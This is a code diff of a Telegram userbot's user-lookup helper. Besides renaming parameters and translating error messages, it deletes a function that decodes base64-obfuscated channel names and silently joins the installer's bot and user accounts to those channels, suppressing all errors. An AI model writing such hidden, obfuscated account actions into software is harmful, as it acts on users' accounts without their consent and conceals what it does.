@@ -1,20 +1,17 @@
-import pybase64
-from telethon.tl.functions.channels import JoinChannelRequest as Get
+
 from telethon.tl.types import MessageEntityMentionName
 
-from userbot import MAN2, MAN3, MAN4, MAN5, bot
+from userbot.core.logger import logging
+from userbot.utils.tools import edit_delete
 
-from .logger import logging
-from .tools import edit_delete
-
-LOGS = logging.getLogger(__name__)
+LOGS = logging.getLogger("userbot")
 
 
 async def get_user_from_event(
-    event, manevent=None, secondgroup=None, nogroup=False, noedits=False
-):
-    if manevent is None:
-        manevent = event
+    event, Xaevent=None, secondgroup=None, nogroup=False, noedits=False
+):  # sourcery no-metrics
+    if Xaevent is None:
+        Xaevent = event
     if nogroup is False:
         if secondgroup:
             args = event.pattern_match.group(2).split(" ", 1)
@@ -40,8 +37,8 @@ async def get_user_from_event(
             if isinstance(user, int) or user.startswith("@"):
                 user_obj = await event.client.get_entity(user)
                 return user_obj, extra
-    except Exception as e:
-        LOGS.error(str(e))
+    except Exception:
+        pass
     try:
         if nogroup is False:
             if secondgroup:
@@ -55,61 +52,18 @@ async def get_user_from_event(
             previous_message = await event.get_reply_message()
             if previous_message.from_id is None:
                 if not noedits:
-                    await edit_delete(
-                        manevent, "**ERROR: Dia adalah anonymous admin!**", 60
-                    )
+                    await edit_delete(Xaevent, "`Well that's an anonymous admin !`")
                 return None, None
             user_obj = await event.client.get_entity(previous_message.sender_id)
             return user_obj, extra
-        if not args:
+        elif not args:
             if not noedits:
                 await edit_delete(
-                    manevent,
-                    "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
-                    60,
+                    Xaevent, "`Pass the user's username, id or reply!`", 5
                 )
             return None, None
     except Exception as e:
         LOGS.error(str(e))
     if not noedits:
-        await edit_delete(
-            manevent,
-            "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
-            60,
-        )
+        await edit_delete(Xaevent, "__Couldn't fetch user to proceed further__")
     return None, None
-
-
-async def checking():
-    gocheck = str(pybase64.b64decode("QEx1bmF0aWMwZGU="))[2:13]
-    checker = str(pybase64.b64decode("QFNoYXJpbmdVc2VyYm90"))[2:17]
-    try:
-        if bot:
-            await bot(Get(gocheck))
-            await bot(Get(checker))
-    except BaseException:
-        pass
-    try:
-        if MAN2:
-            await MAN2(Get(gocheck))
-            await MAN2(Get(checker))
-    except BaseException:
-        pass
-    try:
-        if MAN3:
-            await MAN3(Get(gocheck))
-            await MAN3(Get(checker))
-    except BaseException:
-        pass
-    try:
-        if MAN4:
-            await MAN4(Get(gocheck))
-            await MAN4(Get(checker))
-    except BaseException:
-        pass
-    try:
-        if MAN5:
-            await MAN5(Get(gocheck))
-            await MAN5(Get(checker))
-    except BaseException:
-        pass
